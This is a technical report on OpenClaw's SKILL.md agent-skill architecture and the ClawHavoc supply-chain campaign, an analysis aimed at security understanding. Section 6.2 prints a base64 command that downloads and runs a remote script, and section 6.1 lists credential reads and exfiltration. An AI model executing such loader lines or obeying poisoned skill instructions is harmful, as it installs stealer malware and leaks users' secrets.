Architectural Analysis of the OpenClaw Agent Runtime: The Role of SKILL.md and the Pi Core in Modular Autonomous Systems1. Executive Summary and Ecosystem ContextThe rapid evolution of artificial intelligence from stateless, conversational Large Language Models (LLMs) to persistent, autonomous agents has necessitated a fundamental reimagining of runtime architectures. In this emerging paradigm, the agent is no longer merely a text-processing engine but a computational entity capable of executing code, manipulating file systems, and orchestrating complex workflows across distributed environments. OpenClaw has established itself as a pivotal implementation in this domain, operating as a "local-first" personal AI assistant that rigorously decouples the control plane—managed by the Gateway—from the cognitive runtime, known as the Pi Agent.At the core of OpenClaw's extensibility and operational logic lies the Agent Skills Standard, a specification centered on the SKILL.md file format. This file serves as the definitive interface between human intent, system capability, and the stochastic reasoning of the LLM. It is not merely a documentation artifact but a functional configuration manifest that dictates how the agent perceives its affordances, manages its context window, and interacts with the host operating system.This report provides an exhaustive technical analysis of the SKILL.md architecture within the OpenClaw ecosystem, specifically examining its integration with the underlying Pi Agent core (pi-mono). The analysis explores the lifecycle of a skill—from its static definition on disk to its dynamic injection into the LLM's system prompt—and evaluates the mechanisms of progressive disclosure, metadata gating, and runtime security. Furthermore, this report investigates the broader implications of this architecture, including the critical supply chain vulnerabilities exposed by the ClawHub registry and the "ClawHavoc" malware campaign, effectively mapping the attack surface of modern agentic capabilities. By synthesizing data from architectural documentation, source code analysis, and security incident reports, this document offers a definitive reference for understanding the mechanics and risks of file-based agent skills.2. The Pi Agent Core: The Runtime FoundationTo fully comprehend the function of SKILL.md within OpenClaw, one must first deconstruct the Pi Agent, the embedded runtime derived from the pi-mono repository that powers the assistant's cognitive logic. OpenClaw is not simply a wrapper around an API; it runs a single, embedded agent runtime that operates in RPC (Remote Procedure Call) mode, a design choice that fundamentally shapes how skills are loaded, executed, and managed.2.1 The "Primitives, Not Features" PhilosophyThe architectural philosophy of the Pi Agent is predicated on minimalism, a concept often described in the documentation as providing "Primitives, not features". Unlike "batteries-included" agent frameworks that hardcode complex planning loops, rigid memory structures, or specific task taxonomies, Pi provides a minimal set of core tools—primarily read, write, edit, and bash (or exec)—and relies almost entirely on extensions to define higher-order behaviors.This philosophy holds that the agent should be adapted to the user's workflow through aggressive extensibility rather than dictating a workflow to the user. Consequently, features that are typically intrinsic to an agent's core binary—such as "Plan Mode," sub-agent orchestration, or specific integrations—are instead implemented as Skills or Extensions. This design necessitates a robust, standardized format for teaching the agent new capabilities without altering the core runtime. The SKILL.md file becomes the vehicle for this extensibility, allowing users to inject "software that is malleable like clay" directly into the agent's cognition.The absence of built-in features is intentional. For instance, the Pi core explicitly omits native support for the Model Context Protocol (MCP) or sub-agents, encouraging developers to build these as CLI tools wrapped in SKILL.md definitions if needed. This approach ensures that the core remains lightweight and observable, while the complexity is pushed to the edges—specifically into the skill definitions.2.2 The Monorepo Structure and Dependency GraphThe pi-mono repository enforces a strict layered architecture that dictates how skills are processed and executed. The ecosystem is divided into three distinct layers: foundation packages (zero dependencies), core packages (dependent only on foundation), and applications (OpenClaw, pi-coding-agent). Understanding this hierarchy is crucial for tracing the path of a SKILL.md file from disk to prompt.Foundation Layer (pi-ai): This layer acts as the LLM abstraction mechanism. Rather than building provider-specific adapters for every API, pi-ai normalizes interactions around four wire protocols: OpenAI Completions, OpenAI Responses, Anthropic Messages, and Google Generative AI. This ensures that skills defined in SKILL.md can be executed regardless of the underlying model, provided the model supports the necessary context window and reasoning capabilities.Core Layer (@mariozechner/pi-agent-core): This package contains the essential runtime logic. It includes the Agent class, which handles the core interaction loop, tool calling capabilities, and state management. It is within this layer that the abstract definition of a "tool" exists, waiting to be populated by the specific instructions found in skills.Application/CLI Layer (@mariozechner/pi-coding-agent): This layer provides the specific logic for parsing skill directories, formatting prompt injections, and handling the interactive loop. It exports critical functions like formatSkillsForPrompt, which OpenClaw utilizes to inject skill definitions into the system context.In the OpenClaw implementation, the Pi runtime connects to a Gateway WebSocket control plane (typically ws://127.0.0.1:18789). The Gateway acts as the system's "nervous system," managing sessions, channels (WhatsApp, Slack, Telegram), configuration, and persistence. The Pi runtime, operating in RPC mode, handles the "cognitive" execution—receiving prompts from the Gateway, consulting the loaded skills, executing tools, and returning responses.2.3 Session Management and State PersistenceThe Pi Agent's architecture supports a sophisticated session model that is integral to how skills maintain state. Unlike simple request-response loops, Pi sessions are structured as trees rather than linear logs. This allows for branching and navigation within a session, enabling users (or the agent itself) to "side-quest" into a new branch to debug a skill or perform a sub-task, and then return to the main trunk.State persistence for skills is handled through custom messages within the session files and disk-based persistence. For example, extensions like /todos persist their state by writing markdown files to a specific directory (e.g., .pi/todos). This aligns with the file-centric design of SKILL.md: the file system is the source of truth. Because the system monitors these files, it includes built-in hot reloading. If a user modifies a SKILL.md file or its associated scripts, the runtime detects the change via a "Skills Watcher" and refreshes the snapshot for the next turn, allowing for a tight inner feedback loop during skill development.3. The Anatomy of SKILL.md and the Agent Skills StandardThe SKILL.md file is the primary artifact in the OpenClaw ecosystem. It adheres to the Agent Skills open standard, a format originally popularized by Anthropic and adopted by various tools like Claude Code, Codex, and OpenCode. This standardization ensures interoperability, meaning a skill written for OpenClaw can theoretically function in other compliant environments, provided the necessary binaries are present.3.1 Directory Structure and File OrganizationA valid skill in OpenClaw is defined not just as a file, but as a directory containing a SKILL.md manifest. This directory acts as a self-contained package of capability. The standardized structure is as follows:Path ComponentDescriptionRequirement<workspace>/skills/<skill-name>/The root directory for the skill. The folder name typically matches the skill name.RequiredSKILL.mdThe manifest file containing YAML frontmatter (metadata) and Markdown body (instructions).Requiredscripts/A directory containing executable code (Python, Bash, Node.js) that the skill invokes.Optionalreferences/A directory containing detailed documentation, API specs, or guides loaded on demand.Optionalassets/A directory for templates, static files, or images used by the skill.OptionalThis structure is critical for supporting Progressive Disclosure. The agent does not load the entire content of the scripts/ or references/ folders into the context window at initialization. Instead, it acts like a human expert: it keeps the "manual" (SKILL.md) on the desk but leaves the "reference library" (references/) on the shelf until a specific problem requires a deep dive.3.2 The YAML Frontmatter SchemaThe SKILL.md file must begin with a YAML frontmatter block enclosed by triple dashes (---). This block defines the "API" of the skill for the agent runtime, determining how the skill is discovered, gated, and invoked.Required Fieldsname: A unique identifier (e.g., git-commit, brave-search). This string serves as the handle for the skill and is often mapped to a slash command (e.g., /git-commit) if the skill is user-invocable.description: A semantic description of the skill's purpose (e.g., "Generate or edit images via Gemini 3 Pro"). This field is arguably the most critical for semantic routing; the LLM uses this text to decide whether to invoke the skill in response to a natural language query. Best practices dictate using the third person (e.g., "Processes files" rather than "I can help you...") to optimize this matching process.Operational Control Fieldsuser-invocable: (Boolean, Default: true) Determines if the skill is exposed to the user as a slash command. If set to false, the skill can only be invoked by the agent autonomously or through other internal mechanisms.disable-model-invocation: (Boolean, Default: false) This is a powerful control. If set to true, the skill is effectively hidden from the system prompt's list of available tools, preventing the model from deciding to use it autonomously. However, it remains available for manual user invocation. This is useful for dangerous or high-cost skills that should only be triggered explicitly by the human.command-dispatch: Can be set to tool to bypass the model's reasoning engine entirely and dispatch the input directly to a specific tool function. This turns the skill into a deterministic alias.command-tool: Specifies the exact name of the tool to invoke when command-dispatch is active.command-arg-mode: Defaults to raw. This controls how arguments are passed to the tool during direct dispatch, allowing for raw string forwarding without core parsing interference.3.3 Metadata Gating and Environmental ValidationA distinctive and sophisticated feature of OpenClaw's implementation is Metadata Gating, defined within a metadata object in the YAML frontmatter. This mechanism addresses the "hallucination of capability" problem, where an agent might try to use a tool (like docker or gh) that is not installed on the host system.The runtime logic, located in src/agents/skills/config.ts, parses this metadata during the skill loading phase and enforces the following gates :requires.bins: This field accepts a list of strings representing executable binaries (e.g., ["gh", "node", "python"]). The runtime checks the system's $PATH for these binaries. If any are missing, the skill is silently excluded from the system prompt or marked as unavailable. This ensures the agent never attempts to call a subprocess that will fail at the OS level.requires.env: A list of mandatory environment variables (e.g., OPENAI_API_KEY, AWS_SECRET_ACCESS_KEY). If the environment does not contain these keys, the skill is gated. This is crucial for skills that wrap API interactions.requires.config: This checks for specific truthy paths in the openclaw.json configuration file (e.g., browser.enabled). This allows skills to be toggled based on the user's broader configuration preferences.os: This field restricts skills to specific operating systems (e.g., darwin, linux, win32). This is essential for OS-specific skills, such as AppleScript automation (macOS only) or PowerShell scripts (Windows only).always: If set to true, the skill bypasses other gates and is always included.This gating logic transforms SKILL.md from a static instruction set into a dynamic, context-aware capability that adapts to the host environment.4. The Mechanics of Skill Loading and InjectionThe process by which a static SKILL.md file becomes active cognitive context involves a rigorous loading pipeline that governs precedence, XML formatting, and token economics.4.1 The Precedence HierarchyOpenClaw aggregates skills from multiple locations on the file system. To resolve naming conflicts (e.g., if a user downloads a custom git skill that conflicts with a bundled one), the system applies a strict precedence order :Workspace Skills (<workspace>/skills): Highest Priority. These skills are specific to the current agent session or workspace. They allow for project-specific overrides and highly tailored behaviors.Managed/Local Skills (~/.openclaw/skills): Medium Priority. These are user-level skills shared across all agents running on the same host machine. This is the typical location for skills installed via ClawHub.Bundled Skills: Lowest Priority. These are the skills shipped directly with the OpenClaw installation (npm package or binary). They provide baseline capabilities but can be shadowed by user customizations.Additionally, users can configure skills.load.extraDirs in the openclaw.json config file to include arbitrary directories, which are assigned the lowest precedence.4.2 The XML System Prompt InjectionOnce the eligible skills are identified and filtered through metadata gating, they must be presented to the LLM. The Pi Agent (@mariozechner/pi-coding-agent) exports a critical function, formatSkillsForPrompt, which handles this transformation.OpenClaw injects skills as a compact XML list. This format is chosen because modern LLMs (especially Claude models) are highly optimized for parsing XML structures, allowing the system to demarcate data clearly while minimizing token usage. The format for each skill entry is:XML<skill>
  <name>skill-name</name>
  <description>Skill description text...</description>
  <location>path/to/skill</location>
</skill>
XML Escaping: To ensure the XML remains valid and does not confuse the parser, all values within the tags (name, description, location) are XML-escaped. Special characters are expanded into their entities (e.g., & becomes &amp;, < becomes &lt;).Token Economics: The overhead of this injection is deterministic, allowing the runtime to calculate exactly how much context window space is consumed by skills. The total character impact is calculated using the formula:$$\text{Total Cost} = 195 + \sum_{\text{skills}} (97 + \text{len}(\text{name}) + \text{len}(\text{description}) + \text{len}(\text{location}))$$Here, 195 represents the base overhead for the XML wrapper structure, and 97 represents the per-skill XML tag overhead. This precise calculation prevents the system prompt from silently growing too large and displacing critical conversation history.4.3 The "Skills Watcher" and Hot ReloadingTo support the rapid iteration required for "vibe coding" and agent development, OpenClaw includes a Skills Watcher. This component uses file system listeners to monitor the active skill directories. When a change is detected (e.g., a user edits SKILL.md to refine instructions), the runtime automatically invalidates the cache and refreshes the skills snapshot.This "hot reload" capability means that changes to a skill's instructions or metadata take effect in the next agent turn without requiring a restart of the Gateway or the Pi runtime. This creates a tight feedback loop where users can converse with the agent, notice a deficiency in a skill, edit the file, and immediately retry the request.5. Progressive Disclosure: Context Management StrategyOne of the most critical architectural patterns in OpenClaw and the Pi Agent is Progressive Disclosure. This strategy addresses the "Context Problem"—the limitation of LLM context windows and the prohibitive cost/latency of processing excessive tokens.5.1 The Tiered Loading ModelInstead of dumping all available knowledge into the prompt, the system operates in tiers, mimicking how a human expert manages information:Level 1: Awareness (Metadata): At startup, the agent is only given the name and description of the skill via the XML system prompt injection. This creates an index of capabilities in the model's "mind." The cost is minimal (approx. 24 tokens per skill overhead + content).Level 2: Activation (Instructions): When the user's intent matches a skill's description (semantic routing), the agent "decides" to invoke that skill. The runtime then reads the full content of SKILL.md (instructions, workflows, examples) and injects it into the active context. This typically adds 2,000–5,000 tokens of specific procedural knowledge relevant only to the immediate task.Level 3: Execution (Resources): If the SKILL.md instructions reference external files (e.g., "Run scripts/analyze.py" or "Read references/api_docs.md for details"), these assets are read and loaded only when the agent specifically attempts to access them or execute the script. This ensures that large documentation or code files do not pollute the context unless absolutely necessary.5.2 Comparison with Model Context Protocol (MCP)It is crucial to distinguish between Agent Skills and the Model Context Protocol (MCP), as both are supported in the broader ecosystem (and OpenClaw supports MCP via wrappers like mcporter). They serve distinct architectural roles:FeatureModel Context Protocol (MCP)Agent Skills (SKILL.md)Primary RoleThe "Pipe" (Connectivity)The "Playbook" (Instruction)FunctionExposes what tools/data are available (APIs, DBs).Teaches how and when to use those tools.ContextStructured schemas (JSON) for tool definitions.Unstructured/Semi-structured procedural knowledge (Markdown).ExampleExposes a query_database tool.Instructions on which SQL to write, how to format the output, and where to save the report.In OpenClaw, these technologies are complementary. An MCP server might provide the raw capability to interact with a database, but the SKILL.md provides the "cognitive scaffolding" that guides the agent to use that capability correctly and consistently.6. Execution and Security: The "Lethal Trifecta"The immense power of SKILL.md lies in its ability to execute arbitrary code on the host machine. However, this capability introduces a massive security surface, described by security researchers as the "Lethal Trifecta": the combination of access to private data, exposure to untrusted content, and the ability to communicate externally.6.1 Unsandboxed Execution by DefaultBy default, OpenClaw executes skill instructions on the host machine with the user's full privileges. The documentation explicitly states: "tools run on the host for the main session, so the agent has full access when it's just you". This means a skill defined in SKILL.md can instruct the agent to:Execute shell commands (curl | bash).Read sensitive files (~/.ssh/id_rsa, .env).Exfiltrate data to external servers via curl or wget.This "default allow" posture assumes that the user has personally vetted every skill installed, an assumption that collapses at scale.6.2 The "ClawHavoc" Malware CampaignThe theoretical risks of this architecture materialized in early 2026 with the discovery of the "ClawHavoc" malware campaign. Researchers identified over 341 malicious skills on ClawHub (the skill registry). These skills exploited the trust users place in documentation and the agent's capability to execute instructions.The Attack Vector:Malicious skills often masqueraded as useful tools (e.g., solana-wallet-tracker, youtube-summarize-pro). Their SKILL.md files contained a Prerequisites section that utilized social engineering to trick users (or the agent) into executing malware:Windows: Users were instructed to download a password-protected zip file (openclaw-agent.zip) hosted on an external GitHub repository. This zip contained a trojan/keylogger executable. The password protection was used to evade automated antivirus scanning.macOS: Users were instructed to copy-paste a script from glot.io into their terminal. This script executed a base64-encoded payload:Bashecho 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC83YnV1MjRseThtMXRuOG00KSI=' | base64 -D | bash
Decoded, this command fetched and executed a shell script from a malicious IP (91.92.242.30), which ultimately installed the Atomic Stealer (AMOS) malware.The attack was sophisticated because the SKILL.md file itself was technically benign text; it relied on the execution of that text by the agent or the user to trigger the compromise.6.3 Security Mitigations: Hooks and Allow-listsTo mitigate these risks, OpenClaw employs several security layers, though many require manual configuration or "opt-in" behaviors:exec-approvals.json: An allow-list system that tracks approved command patterns (e.g., /usr/bin/npm install *). Commands matching known patterns are allowed, while new or dangerous patterns (like chaining operators &&, command substitution $(), or accessing sensitive paths like /etc/passwd) are blocked or require explicit user approval. This system degrades gracefully, learning from user behavior.PreToolUse Hooks: The runtime supports a hook system that can intercept tool calls before they are executed. Security-focused skills (like agentguard) utilize these hooks to scan command arguments for dangerous patterns (e.g., curl requests to unknown domains, attempts to read .env files) and block execution proactively.Docker Sandboxing: OpenClaw supports running non-main sessions (e.g., group chats or untrusted tasks) in per-session Docker containers. This isolates the execution environment from the host system, preventing malware from persisting or accessing the user's actual filesystem. However, this is not the default for the main user session.7. The ClawHub Ecosystem and Publishing LifecycleClawHub (clawhub.ai) serves as the centralized registry for OpenClaw skills, functioning similarly to npm for Node.js or PyPI for Python. It allows users to discover, install, update, and publish skills via the CLI, facilitating the rapid expansion of agent capabilities.7.1 Publishing Mechanics and Repository StructureThe publishing workflow relies on the ClawHub CLI (clawhub). To publish a skill, a developer typically follows these steps:Preparation: The developer ensures the skill directory contains a valid SKILL.md with correct metadata.Publishing: The command clawhub publish <path> --slug <slug> --name "<name>" is used. This command packages the skill directory, including the manifest and auxiliary files, and pushes it to the registry.Synchronization: Users can keep their skills up to date using clawhub sync --all, which scans local skill roots and pulls updates from the registry.Unlike traditional package managers that often rely on a package.json or requirements.txt, ClawHub treats the file system and the SKILL.md manifest as the source of truth. The CLI hashes local files to manage versioning and performs basic validation of the YAML frontmatter during the publish process.7.2 Supply Chain VulnerabilitiesThe "ClawHavoc" incident highlighted critical weaknesses in the initial design of the ClawHub ecosystem, many of which mirror early supply chain vulnerabilities in other package managers:Low Barrier to Entry: Originally, publishing required only a GitHub account older than one week. There was no mandatory code review, cryptographic signing, or identity verification beyond this basic check.Immutable Maliciousness via Hot-Reloading: Once a malicious skill was installed, the "Skills Watcher" mechanism meant that an attacker could push a malicious update (e.g., changing a script in scripts/), and if the user updated the skill, the new malicious logic would be hot-reloaded into the active agent session immediately.Trust Signal Manipulation: Attackers artificially inflated download counts for their malicious skills using bots. This leveraged "social proof," tricking users into believing a skill like "Solana Wallet Tracker" was widely trusted because it appeared to have thousands of downloads.In response to these threats, the ecosystem is evolving. Reporting features (hiding skills with 3+ reports) and automated scanning tools (like Snyk's MCP-Scan) have been introduced to statically analyze SKILL.md content for prompt injection payloads and toxic instructions before they can be executed.8. Advanced Skill Patterns and MetaprogrammingOpenClaw embraces the concept of Metaprogramming, where the agent utilizes its own capabilities to extend itself. This recursive capability is a defining feature of the platform.8.1 The skill-creator WorkflowThe skill-creator is a bundled meta-skill designed to bootstrap new capabilities. It exemplifies the power of the architecture:Interaction: The user asks the agent to create a new skill (e.g., "Create a skill to resize images for LinkedIn").Generation: The agent uses the skill-creator instructions to scaffold the directory structure (mkdir skills/image-resize), write the SKILL.md with appropriate frontmatter (including name, description, and requires.bins for python), and generate the necessary Python script using libraries like PIL.Self-Installation: The agent saves these files to <workspace>/skills.Immediate Availability: The Skills Watcher detects the new files, parses the metadata, and injects the new capability into the system prompt. The agent can now use the skill it just wrote in the very next turn.8.2 Browser Automation PatternsAnother advanced pattern is found in the browser-tools skill. Instead of relying on complex external services or heavy browser automation frameworks, this skill utilizes the Pi philosophy of "primitives."
It bundles simple scripts like browser-pick.js which injects an interactive picker into a Chrome instance via the Chrome DevTools Protocol (CDP). This allows the user to click elements on a webpage, and the script returns the CSS selectors to the agent. The agent then uses this information to write robust automation scripts or extract data, effectively bridging the gap between unstructured web content and structured agent actions.9. ConclusionThe integration of SKILL.md within the OpenClaw and Pi Agent architecture represents a significant maturation in the design of autonomous systems. By standardizing procedural knowledge into a portable, file-based format, OpenClaw enables a high degree of modularity and user-driven extensibility that was previously unattainable with monolithic agent designs. The architecture's reliance on progressive disclosure—moving from lightweight metadata awareness to deep instruction loading—demonstrates a sophisticated approach to managing the cognitive load and token economics of Large Language Models.However, this flexibility introduces profound security challenges. The capability for agents to execute code based on unverified Markdown instructions creates a "lethal trifecta" of risks involving data access, untrusted content, and external communication. The "ClawHavoc" campaign serves as a critical case study in the weaponization of agentic supply chains, proving that text files can be as dangerous as binaries when an autonomous agent is the interpreter.Moving forward, the evolution of this ecosystem will likely depend on the development of Formal Capability Verification (FCV) systems  and stricter, verifiable sandboxing protocols. The future of personal AI assistants lies in balancing the immense utility of SKILL.md with the imperative of operational security, transitioning from the era of "vibe coding" to one of rigorous, verified, and secure agentic capabilities.
